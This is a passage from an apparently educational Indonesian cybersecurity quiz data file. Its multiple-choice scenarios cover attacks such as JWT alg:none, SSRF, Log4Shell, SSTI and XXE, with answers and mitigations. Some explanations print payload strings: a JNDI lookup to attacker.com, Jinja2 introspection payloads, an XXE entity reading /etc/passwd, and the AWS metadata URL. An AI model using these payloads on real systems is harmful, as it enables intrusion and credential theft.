      'Ini adalah BEC (Business Email Compromise) — salah satu fraud email dengan kerugian terbesar secara global (miliaran dolar/tahun). Attacker tidak hack email asli, tapi membuat domain mirip (typosquatting). Tiga red flag utama: urgensi + kerahasiaan + rekening baru. Pencegahan: verifikasi transfer besar via saluran kedua (telepon langsung ke CEO), kebijakan dual-approval untuk transfer besar, dan pelatihan awareness keuangan.',
  },

  {
    id: 'sc-jwt-attack-1',
    attackId: 'jwt-attack',
    difficulty: 'menengah',
    title: 'Admin Access dari Akun Biasa',
    context:
      'Log sistem menunjukkan akun pengguna biasa tiba-tiba mengakses endpoint admin. Investigasi menemukan JWT token yang dikirim memiliki payload yang dimodifikasi, dengan field "role" berubah dari "user" menjadi "admin".',
    symptoms: [
      'JWT token memiliki signature yang invalid tapi server menerimanya',
      'Payload token dimodifikasi: role: "user" → role: "admin"',
      'Server menggunakan algoritma "none" untuk verifikasi signature',
      'Tidak ada rate limiting atau anomaly detection pada endpoint auth',
    ],
    options: [
      { text: 'JWT Attack — algoritma "none" memungkinkan modifikasi token tanpa signature valid', isCorrect: true },
      { text: 'SQL Injection pada endpoint yang memproses JWT untuk privilege escalation', isCorrect: false },
      { text: 'Session fixation — attacker menyisipkan session ID admin ke korban', isCorrect: false },
      { text: 'Brute force pada secret key JWT untuk memalsukan signature', isCorrect: false },
    ],
    explanation:
      'Ini adalah JWT "alg:none" Attack. RFC JWT mengizinkan algoritma "none" (tanpa signature). Attacker mengubah header algoritma ke "none", memodifikasi payload (role→admin), dan mengirim token tanpa signature. Jika server tidak memvalidasi algoritma yang diizinkan, token diterima. Pencegahan: whitelist algoritma yang diizinkan (hanya HS256/RS256), tolak token dengan alg:none, dan validasi semua klaim kritis.',
  },

  {
    id: 'sc-cryptojacking-1',
    attackId: 'cryptojacking',
    difficulty: 'menengah',
    title: 'Server Kantor Tiba-tiba Lambat',
    context:
      'Admin sistem menemukan 10 server produksi berjalan pada CPU 95-100% terus-menerus padahal traffic aplikasi normal. Setelah investigasi, ditemukan proses tersembunyi "xmrig" berjalan di semua server tersebut.',
    symptoms: [
      'CPU usage 95-100% tanpa ada beban kerja yang jelas',
      'Proses "xmrig" atau nama acak berjalan sebagai root',
      'Traffic jaringan ke IP mining pool di luar negeri',
      'Listrik dan biaya cloud melonjak signifikan',
    ],
    options: [
      { text: 'Cryptojacking — malware menggunakan resource server untuk mining cryptocurrency', isCorrect: true },
      { text: 'DDoS attack yang membuat server kehabisan resource', isCorrect: false },
      { text: 'Ransomware yang sedang mengenkripsi file di background', isCorrect: false },
      { text: 'Memory leak pada aplikasi yang menyebabkan CPU spike', isCorrect: false },
    ],
    explanation:
      'Ini adalah Cryptojacking (server-side). XMRig adalah miner Monero populer yang digunakan attacker. Setelah masuk via exploit atau misconfiguration, attacker menanam miner sebagai proses tersembunyi. Tidak destruktif seperti ransomware, tapi sangat mahal (CPU, listrik, biaya cloud). Sering tidak disadari berbulan-bulan. Pencegahan: EDR/monitoring proses, network egress filtering untuk IP mining pool, dan patch management rutin.',
  },

  // ── SULIT ──────────────────────────────────────────────────────────────────

  {
    id: 'sc-zero-day-1',
    attackId: 'zero-day',
    difficulty: 'sulit',
    title: 'Exploit yang Tidak Dikenal Antivirus Apapun',
    context:
      'Sebuah lembaga pemerintah mengalami kompromi meski semua sistem di-patch dan antivirus terbaru. Forensik menemukan kode exploit yang tidak cocok dengan signature manapun di database antivirus global.',
    symptoms: [
      'Exploit tidak terdeteksi oleh semua antivirus (VirusTotal: 0/70)',
      'Vulnerability yang dieksploitasi belum ada CVE-nya',
      'Payload sangat targeted — hanya berjalan di konfigurasi spesifik korban',
      'Attacker menggunakan kerentanan di software yang dianggap aman dan ter-patch',
    ],
    options: [
      { text: 'Zero-Day Exploit — mengeksploitasi vulnerability yang belum diketahui vendor', isCorrect: true },
      { text: 'Fileless malware yang menghindari deteksi antivirus berbasis file', isCorrect: false },
      { text: 'Supply chain attack yang menyisipkan backdoor di software resmi', isCorrect: false },
      { text: 'Rootkit yang menyembunyikan diri dari antivirus dengan privilege tinggi', isCorrect: false },
    ],
    explanation:
      'Ini adalah Zero-Day Exploit. "Zero-day" berarti vendor punya 0 hari untuk membuat patch karena kerentanan belum diketahui. Tidak ada signature di database antivirus. Sangat mahal di pasar underground (bisa jutaan dolar untuk browser/OS zero-day). Digunakan oleh APT dan nation-state actors. Mitigasi: defense-in-depth, behavior-based detection (bukan signature), network segmentation, dan least privilege.',
  },

  {
    id: 'sc-supply-chain-1',
    attackId: 'supply-chain',
    difficulty: 'sulit',
    title: 'Update Software Resmi yang Membawa Malware',
    context:
      'Ribuan perusahaan di seluruh dunia terinfeksi malware setelah menginstal update resmi dari vendor software monitoring jaringan terpercaya. Update ditandatangani secara digital dengan sertifikat vendor yang valid.',
    symptoms: [
      'Malware masuk melalui update software yang memiliki signature digital sah',
      'Aktivitas C2 tersamar sebagai traffic monitoring normal',
      'Build server vendor dikompromikan — malware disisipkan saat kompilasi',
      'Hanya aktif di domain perusahaan (menghindari sandbox/lab security)',
    ],
    options: [
      { text: 'Supply Chain Attack — vendor dikompromikan, distribusi software resmi dijadikan vektor', isCorrect: true },
      { text: 'Typosquatting — perusahaan mengunduh update dari domain palsu yang mirip', isCorrect: false },
      { text: 'Watering hole — website vendor diretas untuk menyajikan update berbahaya', isCorrect: false },
      { text: 'Insider threat dari karyawan vendor yang menyisipkan backdoor', isCorrect: false },
    ],
    explanation:
      'Ini adalah Supply Chain Attack, mirip dengan insiden SolarWinds 2020. Build server vendor dikompromikan, malware disisipkan sebelum kompilasi — sehingga binary final memiliki signature digital valid. Pengecekan hash atau antivirus tidak membantu karena update "resmi". Mitigasi: Software Bill of Materials (SBOM), reproducible builds, network segmentation untuk software monitoring, dan anomaly detection pada traffic C2.',
  },

  {
    id: 'sc-ssrf-1',
    attackId: 'ssrf',
    difficulty: 'sulit',
    title: 'Server Internal Terekspos via Fitur Import URL',
    context:
      'Sebuah aplikasi web memiliki fitur "import dari URL" untuk mengambil gambar produk. Seorang peneliti menemukan dengan memasukkan URL http://169.254.169.254/latest/meta-data/, ia bisa membaca metadata instance AWS termasuk temporary credentials.',
    symptoms: [
      'Input URL tidak divalidasi — bisa memasukkan IP internal/lokal',
      'Response aplikasi mengembalikan konten dari IP 169.254.169.254',
      'AWS instance metadata terekspos: IAM role, access key, secret key',
      'Tidak ada whitelist URL atau blokir IP private range',
    ],
    options: [
      { text: 'SSRF — server dipaksa melakukan request ke resource internal atas nama attacker', isCorrect: true },
      { text: 'XXE — XML External Entity mengakses file internal server', isCorrect: false },
      { text: 'Cloud misconfiguration yang membuka metadata endpoint ke publik', isCorrect: false },
      { text: 'IDOR — Insecure Direct Object Reference mengekspos objek yang tidak seharusnya', isCorrect: false },
    ],
    explanation:
      'Ini adalah SSRF (Server-Side Request Forgery). IP 169.254.169.254 adalah AWS Instance Metadata Service (IMDS) yang hanya bisa diakses dari dalam instance. Dengan SSRF, attacker memaksa server melakukan request ke IMDS dan mengembalikan hasilnya. Temporary credentials IAM bisa digunakan untuk mengakses seluruh infrastruktur AWS. Mitigasi: whitelist domain yang diizinkan, blokir IP private/lokal di firewall level aplikasi, gunakan IMDSv2 yang butuh PUT request (tidak bisa via SSRF sederhana).',
  },

  {
    id: 'sc-fileless-1',
    attackId: 'fileless-malware',
    difficulty: 'sulit',
    title: 'Malware yang Tidak Meninggalkan File',
    context:
      'Sebuah bank mengalami kompromi tapi forensik tidak menemukan file malware apapun di disk. Analisis memory dump menemukan PowerShell proses yang melakukan koneksi ke server eksternal, mengandung shellcode yang ter-encode base64.',
    symptoms: [
      'Tidak ada file executable baru di filesystem',
      'PowerShell berjalan dengan parameter encoded yang panjang (-EncodedCommand)',
      'Shellcode ditemukan di memory proses legitimate (PowerShell, wscript)',
      'Registry Run key berisi PowerShell one-liner yang di-encode',
    ],
    options: [
      { text: 'Fileless Malware — payload hidup di memory dan menggunakan tools legitimate (LOLBins)', isCorrect: true },
      { text: 'Rootkit yang menyembunyikan file malware dari filesystem view', isCorrect: false },
      { text: 'Cryptojacking yang hanya menggunakan RAM tanpa file permanen', isCorrect: false },
      { text: 'Zero-day exploit yang meninggalkan jejak minimal', isCorrect: false },
    ],
    explanation:
      'Ini adalah Fileless Malware menggunakan teknik LOLBins (Living Off the Land Binaries). PowerShell adalah tool sah Windows yang digunakan untuk menjalankan shellcode dari memory. Persistensi via registry (bukan file), payload ter-encode untuk menghindari signature. Tantangan forensik: tidak ada "file malware" di disk. Deteksi: memory forensics (Volatility), PowerShell script block logging, AMSI (Anti-Malware Scan Interface).',
  },

  {
    id: 'sc-log4shell-1',
    attackId: 'log4shell',
    difficulty: 'sulit',
    title: 'RCE via Header HTTP yang Di-log',
    context:
      'Server Java mengalami Remote Code Execution. Forensik menemukan attacker memasukkan string "${jndi:ldap://attacker.com/exploit}" di header User-Agent HTTP. Log4j yang digunakan server secara otomatis me-resolve dan mengeksekusi payload dari server LDAP attacker.',
    symptoms: [
      'Log HTTP menunjukkan string "${jndi:ldap://...}" di berbagai header',
      'Server Java melakukan outbound connection ke IP asing pada port LDAP (389)',
      'Class Java asing di-load dari server eksternal secara otomatis',
      'Versi Log4j yang digunakan: 2.0-beta9 hingga 2.14.1',
    ],
    options: [
      { text: 'Log4Shell (CVE-2021-44228) — JNDI lookup di Log4j mengeksekusi code dari server attacker', isCorrect: true },
      { text: 'SSRF via logging library yang melakukan request ke URL eksternal', isCorrect: false },
      { text: 'SQL Injection pada query yang menggunakan output Log4j', isCorrect: false },
      { text: 'XXE pada konfigurasi XML Log4j yang diparse saat startup', isCorrect: false },
    ],
    explanation:
      'Ini adalah Log4Shell (CVE-2021-44228) — salah satu vulnerability paling kritis dalam sejarah (CVSS 10.0). Log4j secara otomatis meng-evaluate expression dalam pesan log, termasuk JNDI lookup. ${jndi:ldap://attacker.com/x} memaksa server melakukan LDAP lookup dan men-download class Java dari server attacker — menghasilkan RCE. Semua input yang di-log adalah attack surface. Patch: upgrade ke Log4j 2.17+, nonaktifkan JNDI lookup.',
  },

  {
    id: 'sc-ssti-1',
    attackId: 'ssti',
    difficulty: 'sulit',
    title: 'Template yang Menjalankan Kode Sistem',
    context:
      'Sebuah web app Python menggunakan Jinja2 untuk template email. Fitur "preview nama di email" mengambil input user langsung ke template. Peneliti memasukkan "{{7*7}}" dan menerima response "49" — bukan string literal "{{7*7}}".',
    symptoms: [
      'Input {{7*7}} ditampilkan sebagai "49" bukan literal "{{7*7}}"',
      'Template engine meng-evaluate ekspresi dalam input user',
      'Payload {{config.items()}} mengembalikan konfigurasi sensitif aplikasi',
      'Dengan payload yang tepat, dapat mengeksekusi command OS',
    ],
    options: [
      { text: 'SSTI (Server-Side Template Injection) — input user dieksekusi sebagai kode template', isCorrect: true },
      { text: 'XSS — skrip JavaScript dalam input dieksekusi di browser', isCorrect: false },
      { text: 'Code injection via eval() yang tidak disanitasi', isCorrect: false },
      { text: 'XXE — XML entity dalam input membaca file sistem', isCorrect: false },
    ],
    explanation:
      'Ini adalah SSTI (Server-Side Template Injection) pada Jinja2. Ketika input user langsung digabungkan ke string template (render(f"Hello {user_input}")), attacker bisa inject kode Jinja2. {{7*7}}=49 membuktikan eksekusi. Payload lebih lanjut: {{\'\'.__class__.__mro__[1].__subclasses__()}} untuk akses Python internals, lalu RCE. Pencegahan: gunakan sandbox Jinja2, pisahkan data dari template (render dengan variabel, bukan string concatenation).',
  },

  {
    id: 'sc-rootkit-1',
    attackId: 'rootkit',
    difficulty: 'sulit',
    title: 'Proses Tersembunyi yang Tidak Muncul di Task Manager',
    context:
      'Seorang analis keamanan curiga ada aktivitas jaringan mencurigakan tapi tidak menemukan proses yang sesuai di Task Manager. Menggunakan tool forensik dari bootable USB, ia menemukan proses "svchost32.exe" yang tidak terlihat di Windows biasa.',
    symptoms: [
      'Tool sistem (Task Manager, netstat) tidak menampilkan proses/koneksi tertentu',
      'Dari bootable forensic OS, proses dan file asing terlihat',
      'Kernel module asing ter-load (ditemukan via forensic analysis)',
      'API system call untuk list proses di-hook dan hasilnya dimanipulasi',
    ],
    options: [
      { text: 'Rootkit — memodifikasi kernel/OS untuk menyembunyikan kehadiran malware', isCorrect: true },
      { text: 'Fileless malware yang berjalan di memory tanpa process entry', isCorrect: false },
      { text: 'Process hollowing — proses legitimate diisi dengan kode berbahaya', isCorrect: false },
      { text: 'Anti-forensic tool yang menghapus log dan jejak', isCorrect: false },
    ],
    explanation:
      'Ini adalah Kernel-level Rootkit. Dengan memodifikasi syscall handler (hook SSDT/IDT), rootkit memfilter output fungsi NtQuerySystemInformation sehingga proses tertentu tidak muncul. Task Manager menggunakan API yang sudah di-hook. Hanya tool yang berjalan di level lebih rendah (bootable forensic OS atau driver langsung baca hardware) yang bisa melihat realitas. Deteksi: integrity checking (Tripwire), memory forensics, cross-view detection tools.',
  },

  {
    id: 'sc-watering-hole-1',
    attackId: 'watering-hole',
    difficulty: 'sulit',
    title: 'Infeksi via Website Industri Terpercaya',
    context:
      'Beberapa perusahaan di industri minyak & gas mengalami kompromi dalam waktu bersamaan. Investigasi menemukan semua korban mengunjungi website asosiasi industri yang sama minggu sebelumnya. Website tersebut telah disisipkan exploit kit.',
    symptoms: [
      'Semua korban memiliki satu kesamaan: mengunjungi website industri X',
      'Website tersebut telah dikompromisi dan menyajikan exploit kit',
      'Exploit menargetkan kerentanan browser/plugin spesifik yang umum di industri',
      'Tidak ada spear-phishing — infeksi terjadi hanya dengan mengunjungi website',
    ],
    options: [
      { text: 'Watering Hole Attack — website yang sering dikunjungi target dikompromisi untuk infeksi', isCorrect: true },
      { text: 'Supply chain attack pada software yang dipakai industri tersebut', isCorrect: false },
      { text: 'Spear phishing massal ke semua anggota asosiasi industri', isCorrect: false },
      { text: 'Insider threat yang mengakses semua perusahaan anggota asosiasi', isCorrect: false },
    ],
    explanation:
      'Ini adalah Watering Hole Attack — seperti predator menunggu di sumber air. Alih-alih menyerang target secara langsung (yang sulit), attacker mengkompromisi website yang pasti dikunjungi target (asosiasi industri, forum spesifik, vendor umum). Drive-by download menginfeksi pengunjung tanpa interaksi. Digunakan oleh APT karena melewati email filter. Mitigasi: browser isolation, patch browser/plugin, Network IDS untuk detect exploit kit traffic.',
  },

  {
    id: 'sc-dependency-confusion-1',
    attackId: 'dependency-confusion',
    difficulty: 'sulit',
    title: 'Package Internal Perusahaan Digantikan Versi Publik',
    context:
      'Pipeline CI/CD perusahaan teknologi besar mulai mengunduh package npm bernama "company-internal-utils" versi 9.0.0 dari registry publik (npmjs.com), padahal versi internal hanya sampai 2.3.1. Package publik tersebut berisi code yang mengekstrak environment variables.',
    symptoms: [
      'Package internal dengan nama sama muncul di registry publik dengan versi lebih tinggi',
      'Package manager (npm/pip) prioritaskan versi publik yang lebih tinggi',
      'Package publik berisi code untuk kirim env vars ke server eksternal',
      'Nama package identik dengan internal package, tapi dari sumber berbeda',
    ],
    options: [
      { text: 'Dependency Confusion — package publik menggantikan package internal karena versi lebih tinggi', isCorrect: true },
      { text: 'Supply chain attack pada registry npm resmi itu sendiri', isCorrect: false },
      { text: 'Typosquatting — nama package hampir sama tapi ada typo kecil', isCorrect: false },
      { text: 'Insider threat yang mempublikasikan package internal ke registry publik', isCorrect: false },
    ],
    explanation:
      'Ini adalah Dependency Confusion (aka Namespace Confusion), ditemukan Alex Birsan 2021 yang berhasil compromise Apple, Microsoft, Netflix via teknik ini. Package manager secara default mengambil versi tertinggi dari semua sumber. Dengan mempublikasikan package bernama sama dengan versi lebih tinggi (9.0.0 > 2.3.1), package publik berbahaya diambil otomatis saat build. Mitigasi: scope package internal (@company/package), pin versi exact, private registry dengan scope blocking, dan Subresource Integrity untuk packages.',
  },

  {
    id: 'sc-oauth-bypass-1',
    attackId: 'oauth-bypass',
    difficulty: 'sulit',
    title: 'Login "dengan Google" yang Dimanipulasi',
    context:
      'Peneliti menemukan bahwa fitur "Login with Google" di sebuah aplikasi tidak memvalidasi parameter "state" dalam OAuth flow. Dengan memanipulasi redirect_uri dan state parameter, attacker bisa mencuri authorization code dan menggunakan akun korban.',
    symptoms: [
      'Parameter "state" dalam OAuth request tidak divalidasi server',
      'redirect_uri bisa diubah ke domain attacker tanpa penolakan',
      'Authorization code diterima server dari domain yang tidak terdaftar',
      'Setelah exploit, attacker login sebagai korban tanpa password',
    ],
    options: [
      { text: 'OAuth Bypass — validasi parameter OAuth yang lemah memungkinkan pencurian authorization code', isCorrect: true },
      { text: 'CSRF pada form login yang menggunakan OAuth sebagai backend', isCorrect: false },
      { text: 'Open redirect pada halaman callback OAuth untuk phishing', isCorrect: false },
      { text: 'Token leakage via Referer header saat redirect OAuth', isCorrect: false },
    ],
    explanation:
      'Ini adalah OAuth Authorization Code Interception via parameter manipulation. "state" parameter harus random dan divalidasi server untuk mencegah CSRF. "redirect_uri" harus di-whitelist ketat. Tanpa validasi ini, attacker bisa: 1) Buat link OAuth dengan redirect ke domain mereka, 2) Korban klik dan authorize, 3) Code dikirim ke attacker, 4) Attacker tukar code dengan access token. Mitigasi: validasi state parameter, strict redirect_uri whitelist, PKCE untuk mobile apps.',
  },

  {
    id: 'sc-xxe-1',
    attackId: 'xxe',
    difficulty: 'sulit',
    title: 'XML Upload yang Membaca File Server',
    context:
      'Sebuah aplikasi invoicing menerima upload file XML. Peneliti mengirim XML yang berisi deklarasi entity eksternal yang mereferensikan file /etc/passwd. Respon dari server mengembalikan isi file tersebut.',
    symptoms: [
      'Aplikasi menerima dan mem-parse XML yang di-upload user',
      'XML parser mengizinkan external entity declarations',
      'Response server berisi konten file sensitif (/etc/passwd, application.properties)',
      'Juga bisa melakukan SSRF — entity mereferensikan URL internal',
    ],
    options: [
      { text: 'XXE (XML External Entity) — parser XML membaca file lokal atau melakukan request via entity', isCorrect: true },
      { text: 'SSRF via file upload yang mengandung URL internal', isCorrect: false },
      { text: 'Path traversal via nama file XML yang berisi "../" sequence', isCorrect: false },
      { text: 'SQL Injection via konten XML yang di-insert ke database', isCorrect: false },
    ],
    explanation:
      'Ini adalah XXE (XML External Entity) Injection. Deklarasi <!ENTITY xxe SYSTEM "file:///etc/passwd"> dalam XML membuat parser mengambil konten file lokal dan menyisipkannya ke response. XXE juga bisa digunakan untuk SSRF dengan protocol file://, http://, gopher://. Pencegahan: nonaktifkan external entity processing di XML parser (FEATURE_SECURE_PROCESSING di Java, libxml_disable_entity_loader() di PHP), gunakan JSON daripada XML jika memungkinkan.',
  },
];
